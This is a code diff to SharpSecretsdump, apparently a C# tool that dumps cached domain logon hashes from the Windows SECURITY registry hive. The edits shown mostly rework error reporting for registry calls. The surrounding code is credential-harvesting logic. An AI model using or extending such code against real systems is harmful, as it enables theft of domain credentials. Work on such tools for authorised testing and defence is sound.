@@ -115,29 +115,27 @@ namespace SharpSecretsdump
                 IntPtr hKey = IntPtr.Zero;
                 IntPtr dummy = IntPtr.Zero;
                 String keyPath = "SECURITY\\Cache";
-                StringBuilder classVal = new StringBuilder(1024);
                 int len = 1024;
-                int result = Interop.RegOpenKeyEx(0x80000002, keyPath, 0, 0x19, ref hKey);
-                if (result != 0)
-                {
-                    int error = Marshal.GetLastWin32Error();
-                    string errorMessage = new Win32Exception((int)error).Message;
-                    Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, error, errorMessage);
-                    return;
-                }
+                int result;
+                StringBuilder classVal = new StringBuilder(1024);
                 IntPtr number = IntPtr.Zero;
-                result = Interop.RegQueryInfoKey(hKey, classVal, ref len, 0, ref dummy, ref dummy, ref dummy,
-                        ref number, ref dummy, ref dummy, ref dummy, IntPtr.Zero);
-                if (result != 0)
-                {
-                    int error = Marshal.GetLastWin32Error();
-                    string errorMessage = new Win32Exception((int)error).Message;
-                    Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, error, errorMessage);
-                    return;
-                }
 
                 if (nlkmKey != null && nlkmKey.Length > 0)
                 {
+                    result = Interop.RegOpenKeyEx(0x80000002, keyPath, 0, 0x19, ref hKey);
+                    if (result != 0)
+                    {
+                        string errorMessage = new Win32Exception((int)result).Message;
+                        Console.WriteLine("Error opening {0} ({1}) : {2}", keyPath, result, errorMessage);
+                    }
+                    result = Interop.RegQueryInfoKey(hKey, classVal, ref len, 0, ref dummy, ref dummy, ref dummy,
+                            ref number, ref dummy, ref dummy, ref dummy, IntPtr.Zero);
+                    if (result != 0)
+                    {
+                        string errorMessage = new Win32Exception((int)result).Message;
+                        Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, result, errorMessage);
+                    }
+
                     Console.WriteLine("[*] Dumping cached domain logon information (domain/username:hash)");
                     byte[] data;
                     string valueName;
@@ -149,9 +147,8 @@ namespace SharpSecretsdump
                         result = Interop.RegEnumValue(hKey, i, classVal, ref len, 0, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                         if (result != 0)
                         {
-                            int error = Marshal.GetLastWin32Error();
-                            string errorMessage = new Win32Exception((int)error).Message;
-                            Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, error, errorMessage);
+                            string errorMessage = new Win32Exception((int)result).Message;
+                            Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, result, errorMessage);
                             return;
                         }
 
@@ -185,9 +182,8 @@ namespace SharpSecretsdump
                     result = Interop.RegOpenKeyEx(0x80000002, keyPath, 0, 0x19, ref hKey);
                     if (result != 0)
                     {
-                        int error = Marshal.GetLastWin32Error();
-                        string errorMessage = new Win32Exception((int)error).Message;
-                        Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, error, errorMessage);
+                        string errorMessage = new Win32Exception((int)result).Message;
+                        Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, result, errorMessage);
                         return;
                     }
                     number = IntPtr.Zero;
@@ -195,9 +191,8 @@ namespace SharpSecretsdump
                             ref dummy, ref dummy, ref dummy, ref dummy, IntPtr.Zero);
                     if (result != 0)
                     {
-                        int error = Marshal.GetLastWin32Error();
-                        string errorMessage = new Win32Exception((int)error).Message;
-                        Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, error, errorMessage);
+                        string errorMessage = new Win32Exception((int)result).Message;
+                        Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, result, errorMessage);
                         return;
                     }
 
@@ -207,9 +202,8 @@ namespace SharpSecretsdump
                         result = Interop.RegEnumKeyEx(hKey, i, classVal, ref len, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref dummy);
                         if (result != 0)
                         {
-                            int error = Marshal.GetLastWin32Error();
-                            string errorMessage = new Win32Exception((int)error).Message;
-                            Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, error, errorMessage);
+                            string errorMessage = new Win32Exception((int)result).Message;
+                            Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, result, errorMessage);
                             return;
                         }
             
@@ -264,9 +258,9 @@ namespace SharpSecretsdump
                         }
                     }
                 }
-                catch
+                catch (Exception exp)
                 {
-                    Console.WriteLine("Boom");
+                    Console.WriteLine(exp.ToString());
                 }
                 Interop.RegCloseKey(hKey);
             }
@@ -292,18 +286,16 @@ namespace SharpSecretsdump
             int result = Interop.RegOpenKeyEx(0x80000002, keyPath, 0, 0x19, ref hKey);
             if (result != 0)
             {
-                int error = Marshal.GetLastWin32Error();
-                string errorMessage = new Win32Exception((int)error).Message;
-                Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, error, errorMessage);
+                string errorMessage = new Win32Exception((int)result).Message;
+                Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, result, errorMessage);
                 return;
             }
             IntPtr number = IntPtr.Zero;
             result = Interop.RegQueryInfoKey(hKey, classVal, ref len, 0, ref number, ref dummy, ref dummy, ref dummy, ref dummy, ref dummy, ref dummy, IntPtr.Zero);
             if (result != 0)
             {
-                int error = Marshal.GetLastWin32Error();
-                string errorMessage = new Win32Exception((int)error).Message;
-                Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, error, errorMessage);
+                string errorMessage = new Win32Exception((int)result).Message;
+                Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, result, errorMessage);
                 return;
             }
 
@@ -313,9 +305,8 @@ namespace SharpSecretsdump
                 result = Interop.RegEnumKeyEx(hKey, i, classVal, ref len, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref dummy);
                 if (result != 0)
                 {
-                    int error = Marshal.GetLastWin32Error();
-                    string errorMessage = new Win32Exception((int)error).Message;
-                    Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, error, errorMessage);
+                    string errorMessage = new Win32Exception((int)result).Message;
+                    Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, result, errorMessage);
                     return;
                 }
 
@@ -428,9 +419,8 @@ namespace SharpSecretsdump
             int result = Interop.RegOpenKeyEx(0x80000002, keyPath, 0, 0x19, ref hKey);
             if (result != 0)
             {
-                int error = Marshal.GetLastWin32Error();
-                string errorMessage = new Win32Exception((int)error).Message;
-                Console.WriteLine("Error opening {0} ({1}) : {2}", keyPath, error, errorMessage);
+                string errorMessage = new Win32Exception((int)result).Message;
+                Console.WriteLine("Error opening {0} ({1}) : {2}", keyPath, result, errorMessage);
                 return null;
             }
 
@@ -438,9 +428,8 @@ namespace SharpSecretsdump
             result = Interop.RegQueryValueEx(hKey, valueName, 0, IntPtr.Zero, IntPtr.Zero, ref cbData);
             if (result != 0)
             {
-                int error = Marshal.GetLastWin32Error();
-                string errorMessage = new Win32Exception((int)error).Message;
-                Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, error, errorMessage);
+                string errorMessage = new Win32Exception((int)result).Message;
+                Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, result, errorMessage);
                 return null;
             }
 
@@ -448,9 +437,8 @@ namespace SharpSecretsdump
             result = Interop.RegQueryValueEx(hKey, valueName, 0, IntPtr.Zero, dataPtr, ref cbData);
             if (result != 0)
             {
-                int error = Marshal.GetLastWin32Error();
-                string errorMessage = new Win32Exception((int)error).Message;
-                Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, error, errorMessage);
+                string errorMessage = new Win32Exception((int)result).Message;
+                Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, result, errorMessage);
                 return null;
             }
             byte[] data = new byte[cbData];
